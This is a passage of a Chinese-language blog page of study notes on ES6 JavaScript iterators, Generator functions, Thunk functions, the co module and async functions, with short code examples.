class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var it = makeIterator([&apos;a&apos;, &apos;b&apos;]); </span><br><span class="line">it.next() // &#123; value: &quot;a&quot;, done: false &#125; </span><br><span class="line">it.next() // &#123; value: &quot;b&quot;, done: false &#125; </span><br><span class="line">it.next() // &#123; value: undefined, done: true &#125; </span><br><span class="line">function makeIterator(array) &#123; </span><br><span class="line">  var nextIndex = 0; </span><br><span class="line">  return &#123; </span><br><span class="line">    next: function() &#123; </span><br><span class="line">      return nextIndex &lt; array.length ? </span><br><span class="line">      &#123;value: array[nextIndex++], done: false&#125; : </span><br><span class="line">      &#123;value: undefined, done: true&#125;; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用-Iterator-接口的场合"><a href="#调用-Iterator-接口的场合" class="headerlink" title="调用 Iterator 接口的场合"></a>调用 Iterator 接口的场合</h3><h4 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h4><p>对数组和 Set 结构进行解构赋值时，会默认调用 Symbol.iterator 方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let set = new Set().add(&apos;a&apos;).add(&apos;b&apos;).add(&apos;c&apos;); </span><br><span class="line">let [x,y] = set; </span><br><span class="line">// x=&apos;a&apos;; y=&apos;b&apos; </span><br><span class="line">let [first, ...rest] = set; </span><br><span class="line">// first=&apos;a&apos;; rest=[&apos;b&apos;,&apos;c&apos;];</span><br></pre></td></tr></table></figure></p><h4 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符"></a>扩展运算符</h4><p>扩展运算符（…）也会调用默认的 Iterator 接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var str = &apos;hello&apos;; </span><br><span class="line">[...str] // [&apos;h&apos;,&apos;e&apos;,&apos;l&apos;,&apos;l&apos;,&apos;o&apos;]</span><br></pre></td></tr></table></figure></p><h4 id="yield"><a href="#yield" class="headerlink" title="yield*"></a>yield*</h4><p>yield* 后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let generator = function* () &#123; </span><br><span class="line">  yield 1; </span><br><span class="line">  yield* [2,3,4]; </span><br><span class="line">  yield 5; </span><br><span class="line">&#125;;</span><br><span class="line">var iterator = generator(); </span><br><span class="line">iterator.next() // &#123; value: 1, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 2, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 3, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 4, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: 5, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure></p><h4 id="其他场合"><a href="#其他场合" class="headerlink" title="其他场合"></a>其他场合</h4><p>由于数组的遍历会调用遍历器接口，所以任何接受数组作为参数的场合，其实都调用了遍历器接口。</p><ul><li>for…of </li><li>Array.from() </li><li>Map(), Set(), WeakMap(), WeakSet()（比如 new Map([[‘a’,1], [‘b’,2]]) ） </li><li>Promise.all() </li><li>Promise.race()</li></ul><h3 id="字符串的-Iterator-接口"><a href="#字符串的-Iterator-接口" class="headerlink" title="字符串的 Iterator 接口"></a>字符串的 Iterator 接口</h3><p>字符串是一个类似数组的对象，也原生具有 Iterator 接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var someString = &quot;hi&quot;; </span><br><span class="line">typeof someString[Symbol.iterator] </span><br><span class="line">// &quot;function&quot; </span><br><span class="line">var iterator = someString[Symbol.iterator](); </span><br><span class="line">iterator.next() // &#123; value: &quot;h&quot;, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: &quot;i&quot;, done: false &#125; </span><br><span class="line">iterator.next() // &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure></p><h3 id="遍历器对象的return-，throw"><a href="#遍历器对象的return-，throw" class="headerlink" title="遍历器对象的return()，throw()"></a>遍历器对象的return()，throw()</h3><ul><li>遍历器对象除了具有 next 方法，还可以具有 return 方法和 throw 方法。</li><li>return 方法的使用场合是，如果 for…of 循环提前退出（通常是因为出错， 或者有 break 语句或 continue 语句），就会调用 return 方法。如果一个对象在完成遍历前，需要清理或释放资源，就可以部署 return 方法。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function readLinesSync(file) &#123; </span><br><span class="line">  return &#123; </span><br><span class="line">    next() &#123; </span><br><span class="line">      return &#123; done: false &#125;; </span><br><span class="line">    &#125;,</span><br><span class="line">    return() &#123; </span><br><span class="line">      file.close(); </span><br><span class="line">      return &#123; done: true &#125;; </span><br><span class="line">    &#125;, </span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//return会被调用的情况</span><br><span class="line">// 情况一 </span><br><span class="line">for (let line of readLinesSync(fileName)) &#123; </span><br><span class="line">  console.log(line); </span><br><span class="line">  break; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 情况二 </span><br><span class="line">for (let line of readLinesSync(fileName)) &#123; </span><br><span class="line">  console.log(line); </span><br><span class="line">  continue; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 情况三 </span><br><span class="line">for (let line of readLinesSync(fileName)) &#123; </span><br><span class="line">  console.log(line); </span><br><span class="line">  throw new Error(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Generator函数"><a href="#Generator函数" class="headerlink" title="Generator函数"></a>Generator函数</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>Generator 函数是一个状态机，封装了多个内部状态。</li><li>执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。</li><li>调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function* helloWorldGenerator() &#123; </span><br><span class="line">  yield &apos;hello&apos;; </span><br><span class="line">  yield &apos;world&apos;; </span><br><span class="line">  return &apos;ending&apos;; </span><br><span class="line">&#125;</span><br><span class="line">var hw = helloWorldGenerator();</span><br><span class="line"></span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: &apos;hello&apos;, done: false &#125; </span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: &apos;world&apos;, done: false &#125; </span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: &apos;ending&apos;, done: true &#125; </span><br><span class="line">hw.next() </span><br><span class="line">// &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure><h3 id="yield-表达式"><a href="#yield-表达式" class="headerlink" title="yield 表达式"></a>yield 表达式</h3><p>next 方法的运行逻辑:</p><ul><li>遇到 yield 表达式，就暂停执行后面的操作，并将紧跟在 yield 后面的那个表达式的值，作为返回的对象的 value 属性值。</li><li>下一次调用 next 方法时，再继续往下执行，直到遇到下一个 yield 表达式。</li><li>如果没有再遇到新的 yield 表达式，就一直运行到函数结束，直到 return 语句为止，并将 return 语句后面的表达式的值，作为返回的对象的 value 属性值。</li><li>如果该函数没有 return 语句，则返回的对象的 value 属性值为 undefined 。</li></ul><p>注意点：</p><ul><li>yield 表达式只能用在 Generator 函数里面，用在其他地方都会报错。</li><li>yield 表达式如果用在另一个表达式之中，必须放在圆括号里面。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function* demo() &#123; </span><br><span class="line">  console.log(&apos;Hello&apos; + yield); // SyntaxError </span><br><span class="line">  console.log(&apos;Hello&apos; + yield 123); // SyntaxError </span><br><span class="line">  console.log(&apos;Hello&apos; + (yield)); // OK </span><br><span class="line">  console.log(&apos;Hello&apos; + (yield 123)); // OK </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="next-方法的参数"><a href="#next-方法的参数" class="headerlink" title="next 方法的参数"></a>next 方法的参数</h3><p>yield 表达式本身没有返回值，或者说总是返回 undefined 。 next 方法可以带一个参数，该参数就会被当作上一个 yield 表达式的返回值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function* f() &#123; </span><br><span class="line">  for(var i = 0; true; i++) &#123; </span><br><span class="line">    var reset = yield i; </span><br><span class="line">    if(reset) &#123; </span><br><span class="line">      i = -1; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var g = f(); </span><br><span class="line">g.next() // &#123; value: 0, done: false &#125; </span><br><span class="line">g.next() // &#123; value: 1, done: false &#125; </span><br><span class="line">g.next(true) // &#123; value: 0, done: false &#125;</span><br></pre></td></tr></table></figure></p><h3 id="for…of-循环"><a href="#for…of-循环" class="headerlink" title="for…of 循环"></a>for…of 循环</h3><p>for…of 循环可以自动遍历 Generator 函数时生成的 Iterator 对象，且此时不再需要调用 next 方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function* numbers () &#123; </span><br><span class="line">  yield 1 </span><br><span class="line">  yield 2 </span><br><span class="line">  return 3 </span><br><span class="line">  yield 4 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 扩展运算符 </span><br><span class="line">[...numbers()] // [1, 2] </span><br><span class="line"></span><br><span class="line">// Array.from 方法 </span><br><span class="line">Array.from(numbers()) // [1, 2] </span><br><span class="line"></span><br><span class="line">// 解构赋值 </span><br><span class="line">let [x, y] = numbers(); </span><br><span class="line">x // 1 </span><br><span class="line">y // 2 </span><br><span class="line"></span><br><span class="line">// for...of 循环 </span><br><span class="line">for (let n of numbers()) &#123; </span><br><span class="line">  console.log(n) </span><br><span class="line">&#125;</span><br><span class="line">// 1</span><br><span class="line">// 2</span><br></pre></td></tr></table></figure></p><h3 id="Generator-prototype-throw"><a href="#Generator-prototype-throw" class="headerlink" title="Generator.prototype.throw()"></a>Generator.prototype.throw()</h3><ul><li>Generator 函数返回的遍历器对象，都有一个 throw 方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。</li><li>Generator 函数体内抛出的错误，也可以被函数体外的 catch 捕获。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var g = function* () &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    yield; </span><br><span class="line">  &#125; catch (e) &#123; </span><br><span class="line">    console.log(&apos;内部捕获&apos;, e); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;;</span><br><span class="line">var i = g(); </span><br><span class="line">i.next(); </span><br><span class="line">try &#123; </span><br><span class="line">  i.throw(&apos;a&apos;); </span><br><span class="line">  i.throw(&apos;b&apos;); </span><br><span class="line">&#125; catch (e) &#123; </span><br><span class="line">  console.log(&apos;外部捕获&apos;, e); </span><br><span class="line">&#125;</span><br><span class="line">// 内部捕获 a </span><br><span class="line">// 外部捕获 b</span><br></pre></td></tr></table></figure><h3 id="Generator-prototype-return"><a href="#Generator-prototype-return" class="headerlink" title="Generator.prototype.return()"></a>Generator.prototype.return()</h3><p>Generator 函数返回的遍历器对象，还有一个 return 方法，可以返回给定的值，并且终结遍历 Generator 函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function* gen() &#123; </span><br><span class="line">  yield 1; </span><br><span class="line">  yield 2; </span><br><span class="line">  yield 3; </span><br><span class="line">&#125;</span><br><span class="line">var g = gen(); </span><br><span class="line">g.next() // &#123; value: 1, done: false &#125; </span><br><span class="line">g.return(&apos;foo&apos;) // &#123; value: &quot;foo&quot;, done: true &#125; </span><br><span class="line">g.next() // &#123; value: undefined, done: true &#125;</span><br></pre></td></tr></table></figure></p><h3 id="yield-表达式-1"><a href="#yield-表达式-1" class="headerlink" title="yield* 表达式"></a>yield* 表达式</h3><ul><li>用来在一个 Generator 函数里面执行另一个Generator 函数。</li><li>yield* 命令可以很方便地取出嵌套数组的所有成员。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function* foo() &#123; </span><br><span class="line">  yield &apos;a&apos;; </span><br><span class="line">  yield &apos;b&apos;; </span><br><span class="line">&#125;</span><br><span class="line">function* bar() &#123; </span><br><span class="line">  yield &apos;x&apos;; </span><br><span class="line">  yield* foo(); </span><br><span class="line">  yield &apos;y&apos;; </span><br><span class="line">&#125;</span><br><span class="line">// &quot;x&quot; </span><br><span class="line">// &quot;a&quot; </span><br><span class="line">// &quot;b&quot; </span><br><span class="line">// &quot;y&quot;</span><br></pre></td></tr></table></figure><h3 id="Generator-函数的-this"><a href="#Generator-函数的-this" class="headerlink" title="Generator 函数的 this"></a>Generator 函数的 this</h3><p>Generator 函数总是返回一个遍历器，ES6 规定这个遍历器是 Generator 函数的实例，也继承了 Generator 函数的 prototype 对象上的方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function* g() &#123;&#125; </span><br><span class="line">g.prototype.hello = function () &#123; </span><br><span class="line">  return &apos;hi!&apos;; </span><br><span class="line">&#125;;</span><br><span class="line">let obj = g(); </span><br><span class="line">obj instanceof g // true </span><br><span class="line">obj.hello() // &apos;hi!&apos;</span><br></pre></td></tr></table></figure></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="Generator-与状态机"><a href="#Generator-与状态机" class="headerlink" title="Generator 与状态机"></a>Generator 与状态机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//ES5</span><br><span class="line">var ticking = true; </span><br><span class="line">var clock = function() &#123; </span><br><span class="line">  if (ticking) </span><br><span class="line">    console.log(&apos;Tick!&apos;); </span><br><span class="line">  else</span><br><span class="line">    console.log(&apos;Tock!&apos;); </span><br><span class="line">  ticking = !ticking;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//ES6</span><br><span class="line">var clock = function* () &#123; </span><br><span class="line">  while (true) &#123; </span><br><span class="line">    console.log(&apos;Tick!&apos;); </span><br><span class="line">    yield; </span><br><span class="line">    console.log(&apos;Tock!&apos;); </span><br><span class="line">    yield; </span><br><span class="line">  &#125; &#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="异步操作的同步化表达"><a href="#异步操作的同步化表达" class="headerlink" title="异步操作的同步化表达"></a>异步操作的同步化表达</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function* main() &#123; </span><br><span class="line">  var result = yield request(&quot;http://some.url&quot;); </span><br><span class="line">  var resp = JSON.parse(result); </span><br><span class="line">  console.log(resp.value); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function request(url) &#123; </span><br><span class="line">  makeAjaxCall(url, function(response)&#123; </span><br><span class="line">    it.next(response); </span><br><span class="line">  &#125;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var it = main(); </span><br><span class="line">it.next();</span><br></pre></td></tr></table></figure><h4 id="控制流管理"><a href="#控制流管理" class="headerlink" title="控制流管理"></a>控制流管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function* longRunningTask(value1) &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    var value2 = yield step1(value1); </span><br><span class="line">    var value3 = yield step2(value2); </span><br><span class="line">    var value4 = yield step3(value3); </span><br><span class="line">    var value5 = yield step4(value4); </span><br><span class="line">    // Do something with value4 </span><br><span class="line">  &#125; catch (e) &#123; </span><br><span class="line">    // Handle any error from step1 through step4 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scheduler(longRunningTask(initialValue)); </span><br><span class="line">function scheduler(task) &#123; </span><br><span class="line">  var taskObj = task.next(task.value); </span><br><span class="line">  // 如果Generator函数未结束，就继续调用 </span><br><span class="line">  if (!taskObj.done) &#123; </span><br><span class="line">    task.value = taskObj.value scheduler(task); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="部署-Iterator-接口"><a href="#部署-Iterator-接口" class="headerlink" title="部署 Iterator 接口"></a>部署 Iterator 接口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function* makeSimpleGenerator(array)&#123; </span><br><span class="line">  var nextIndex = 0; </span><br><span class="line">  while(nextIndex &lt; array.length)&#123; </span><br><span class="line">    yield array[nextIndex++]; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var gen = makeSimpleGenerator([&apos;yo&apos;, &apos;ya&apos;]); </span><br><span class="line">gen.next().value // &apos;yo&apos; </span><br><span class="line">gen.next().value // &apos;ya&apos; </span><br><span class="line">gen.next().done // true</span><br></pre></td></tr></table></figure><h4 id="作为数据结构"><a href="#作为数据结构" class="headerlink" title="作为数据结构"></a>作为数据结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function *doStuff() &#123; </span><br><span class="line">  yield fs.readFile.bind(null, &apos;hello.txt&apos;); </span><br><span class="line">  yield fs.readFile.bind(null, &apos;world.txt&apos;); </span><br><span class="line">  yield fs.readFile.bind(null, &apos;and-such.txt&apos;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (task of doStuff()) &#123; </span><br><span class="line">  // task是一个函数，可以像回调函数那样使用它 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Generator函数的异步应用"><a href="#Generator函数的异步应用" class="headerlink" title="Generator函数的异步应用"></a>Generator函数的异步应用</h2><h3 id="Thunk-函数"><a href="#Thunk-函数" class="headerlink" title="Thunk 函数"></a>Thunk 函数</h3><p>编译器的“传名调用”实现，往往是将参数放到一个临时函数之中，再将这个临时函数传入函数体。这个临时函数就叫做 Thunk 函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function f(m) &#123; </span><br><span class="line">  return m * 2; </span><br><span class="line">&#125;</span><br><span class="line">f(x + 5); </span><br><span class="line">// 等同于 </span><br><span class="line">var thunk = function () &#123; </span><br><span class="line">  return x + 5; </span><br><span class="line">&#125;;</span><br><span class="line">function f(thunk) &#123; </span><br><span class="line">  return thunk() * 2; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="JavaScript-语言的-Thunk-函数"><a href="#JavaScript-语言的-Thunk-函数" class="headerlink" title="JavaScript 语言的 Thunk 函数"></a>JavaScript 语言的 Thunk 函数</h3><p>在 JavaScript 语言 中，Thunk 函数替换的不是表达式，而是多参数函数，将其替换成一个只接受回调函数作为参数的单参数函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 正常版本的readFile（多参数版本） </span><br><span class="line">fs.readFile(fileName, callback); </span><br><span class="line"></span><br><span class="line">// Thunk版本的readFile（单参数版本） </span><br><span class="line">var Thunk = function (fileName) &#123; </span><br><span class="line">  return function (callback) &#123; </span><br><span class="line">    return fs.readFile(fileName, callback); </span><br><span class="line">  &#125;; </span><br><span class="line">&#125;;</span><br><span class="line">var readFileThunk = Thunk(fileName); </span><br><span class="line">readFileThunk(callback);</span><br></pre></td></tr></table></figure></p><h3 id="Thunkify-模块"><a href="#Thunkify-模块" class="headerlink" title="Thunkify 模块"></a>Thunkify 模块</h3><p>确保回调函数只运行一次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function f(a, b, callback)&#123; </span><br><span class="line">  var sum = a + b; </span><br><span class="line">  callback(sum); </span><br><span class="line">  callback(sum); </span><br><span class="line">&#125;</span><br><span class="line">var ft = thunkify(f); </span><br><span class="line">var print = console.log.bind(console); </span><br><span class="line">ft(1, 2)(print); </span><br><span class="line">// 3</span><br></pre></td></tr></table></figure></p><h3 id="Generator函数的流程管理"><a href="#Generator函数的流程管理" class="headerlink" title="Generator函数的流程管理"></a>Generator函数的流程管理</h3><p>Thunk 函数真正的威力，在于可以自动执行 Generator 函数。下面就是一个基于 Thunk 函数的 Generator 执行器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function run(fn) &#123; </span><br><span class="line">  var gen = fn(); </span><br><span class="line">  function next(err, data) &#123; </span><br><span class="line">    var result = gen.next(data); </span><br><span class="line">    if (result.done) return; </span><br><span class="line">    result.value(next); </span><br><span class="line">  &#125;</span><br><span class="line">  next(); </span><br><span class="line">&#125;</span><br><span class="line">function* g() &#123; </span><br><span class="line">  // ... </span><br><span class="line">&#125;</span><br><span class="line">run(g);</span><br></pre></td></tr></table></figure></p><h3 id="co-模块"><a href="#co-模块" class="headerlink" title="co 模块"></a>co 模块</h3><p>co 模块可以让你不用编写 Generator 函数的执行器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var gen = function* () &#123; </span><br><span class="line">  var f1 = yield readFile(&apos;/etc/fstab&apos;); </span><br><span class="line">  var f2 = yield readFile(&apos;/etc/shells&apos;); </span><br><span class="line">  console.log(f1.toString()); </span><br><span class="line">  console.log(f2.toString()); </span><br><span class="line">&#125;;</span><br><span class="line">var co = require(&apos;co&apos;); </span><br><span class="line">co(gen);</span><br></pre></td></tr></table></figure></p><h2 id="async函数"><a href="#async函数" class="headerlink" title="async函数"></a>async函数</h2><h3 id="含义-1"><a href="#含义-1" class="headerlink" title="含义"></a>含义</h3><p>它就是 Generator 函数的语法糖。async 函数对 Generator 函数的改进，体现在以下四点。</p><ul><li>内置执行器。</li><li>更好的语义。</li><li>更广的适用性。</li><li>返回值是 Promise。</li></ul><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>当函数执行的时候，一旦遇到 await 就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">async function getStockPriceByName(name) &#123; </span><br><span class="line">  var symbol = await getStockSymbol(name); </span><br><span class="line">  var stockPrice = await getStockPrice(symbol); </span><br><span class="line">  return stockPrice; </span><br><span class="line">&#125;</span><br><span class="line">getStockPriceByName(&apos;goog&apos;).then(function (result) &#123; </span><br><span class="line">  console.log(result); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>async 函数内部抛出错误，会导致返回的 Promise 对象变为 reject 状态。抛出的错误对象会被 catch 方法回调函数接收到。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">async function f() &#123; </span><br><span class="line">  throw new Error(&apos;出错了&apos;); </span><br><span class="line">&#125;</span><br><span class="line">f().then( </span><br><span class="line">  v =&gt; console.log(v), </span><br><span class="line">  e =&gt; console.log(e) </span><br><span class="line">)</span><br><span class="line">// Error: 出错了</span><br></pre></td></tr></table></figure></p><h3 